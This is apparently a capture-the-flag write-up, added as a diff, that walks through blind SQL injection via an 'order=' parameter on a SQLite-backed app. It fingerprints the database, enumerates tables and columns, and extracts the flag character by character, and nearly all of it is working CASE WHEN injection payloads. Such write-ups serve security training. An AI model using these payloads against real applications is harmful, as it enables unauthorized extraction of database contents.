@@ -1,0 +1,49 @@
+***Application analyzing***
+Vulnerable parameter:	?order=
+	?order=(CASE WHEN 1=2 THEN title ELSE date END)	---> reslut columns order by the 'date'
+	?order=(CASE WHEN 1=1 THEN title ELSE date END)	---> columns in result order by the 'title'
+
+Vulnerablity Type:
+	Error based sqli at 'order by' clasue
+
+
+***Database fingerprinting***
+	?order=(Case WHEN (select version())=1 THEN 1 ELSE 2 end)	---> error, so dbms is not 'MySQL' nor 'PostgreSQL'
+	?order=(Case WHEN (sqlite_version())=1 THEN 1 ELSE 2 end)	---> no error, so dbms is 'sqlite'
+  DBMS is: 'sqlite'
+
+
+---------Enumeration-----------
+***Identify the length of tables***
+1st table	--->	?order=(Case WHEN (SELECT length(name) FROM sqlite_master WHERE type='table' limit 1)=5 THEN title ELSE date end)	--->	columns in result order by the 'title', so length(1st table) is: '5'
+2nd table	--->	?order=(Case WHEN (SELECT length(name) FROM sqlite_master WHERE type='table' limit 1,1)=4 THEN title ELSE date end)	--->	so, lenght(2nd table) is: '4'
+
+***Name of the tables***
+1st table	--->	?order=(Case WHEN (SELECT name FROM sqlite_master WHERE type='table' limit 1) like 'todos%' THEN title ELSE date end)	--->	columns in result ordered by 'title', so table name is: 'todos'
+2nd table	--->	?order=(Case WHEN (SELECT name FROM sqlite_master WHERE type='table' limit 1,1) like 'flag%' THEN title ELSE date end)	--->	so, table name is: 'flag'
+
+
+***Length of columns name in 'flag' table***
+1st column name lenght	---->	?order=(Case WHEN (SELECT length(name) FROM pragma_table_info('flag') limit 1)=4 THEN title ELSE date end)	--->	so, length(1st column name) is: '4'
+
+***Name of column in 'flag' table***
+1st column	--->	?order=(Case WHEN (SELECT name FROM pragma_table_info('flag') limit 1) like 'flag%' THEN title ELSE date end)	--->	so, name of 1st column is: 'flag'
+
+
+***Length of cell value in 'flag' column of 'flag' table***
+1st cell value's length	--->	?order=(Case WHEN (SELECT length(flag) FROM flag limit 1)=38 THEN title ELSE date end)	--->	so, length of 1st cell value is: '38'
+
+***Cell value***
+1st cell value	--->	?order=(Case WHEN (SELECT flag FROM flag limit 1) like 'F%' THEN title ELSE date end)
+ similarly:	?order=(Case WHEN substr((SELECT flag FROM flag limit 1),1,1) = 'f' THEN title ELSE date end)
+		?order=(Case WHEN substr((SELECT flag FROM flag limit 1),1,2) = 'fl' THEN title ELSE date end)
+		.....
+		.....
+		?order=(Case WHEN substr((SELECT flag FROM flag limit 1),1,5) = 'flag{' THEN title ELSE date end)
+		.....
+		.....
+Veirfy the flag:		?order=(Case WHEN substr((SELECT flag FROM flag limit 1),1,38) = 'flag{*******************}' THEN title ELSE date end)
+
+
+
+
